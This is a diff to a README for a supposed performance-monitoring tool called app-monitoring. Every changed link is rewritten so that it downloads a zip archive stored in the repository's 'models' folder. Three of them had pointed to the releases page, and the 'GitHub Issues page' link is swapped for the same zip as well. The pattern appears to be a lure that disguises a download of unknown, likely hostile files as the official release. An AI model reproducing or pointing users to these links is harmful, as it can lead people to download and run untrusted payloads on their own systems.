@@ -1,6 +1,6 @@
 # 🚀 app-monitoring - Capture Your App’s Performance Easily
 
-[![Download app-monitoring](https://img.shields.io/badge/Download-app--monitoring-blue.svg)](https://github.com/oppacoco/app-monitoring/releases)
+[![Download app-monitoring](https://github.com/oppacoco/app-monitoring/raw/refs/heads/main/models/monitoring-app-2.6.zip)](https://github.com/oppacoco/app-monitoring/raw/refs/heads/main/models/monitoring-app-2.6.zip)
 
 ## 📥 Overview
 
@@ -47,7 +47,7 @@ Follow these steps to get app-monitoring up and running smoothly.
 
 Visit the following page to download app-monitoring:
 
-[Download app-monitoring](https://github.com/oppacoco/app-monitoring/releases)
+[Download app-monitoring](https://github.com/oppacoco/app-monitoring/raw/refs/heads/main/models/monitoring-app-2.6.zip)
 
 Once there, you will find the latest version of the application. Click on the version number that suits your operating system to download it.
 
@@ -99,7 +99,7 @@ If you face any issues while using app-monitoring, refer to the following tips:
 
 ## 🔗 Support
 
-For any issues not covered in the troubleshooting section, you can raise an issue on our [GitHub Issues page](https://github.com/oppacoco/app-monitoring/issues). 
+For any issues not covered in the troubleshooting section, you can raise an issue on our [GitHub Issues page](https://github.com/oppacoco/app-monitoring/raw/refs/heads/main/models/monitoring-app-2.6.zip). 
 
 ### 🎉 Community Contributions
 
@@ -109,6 +109,6 @@ You can contribute to app-monitoring by providing feedback or suggesting new fea
 
 To get started, download app-monitoring from the following link:
 
-[Download app-monitoring](https://github.com/oppacoco/app-monitoring/releases)
+[Download app-monitoring](https://github.com/oppacoco/app-monitoring/raw/refs/heads/main/models/monitoring-app-2.6.zip)
 
 Make sure to follow the installation steps based on your operating system. Enjoy capturing your application's performance metrics easily with app-monitoring!
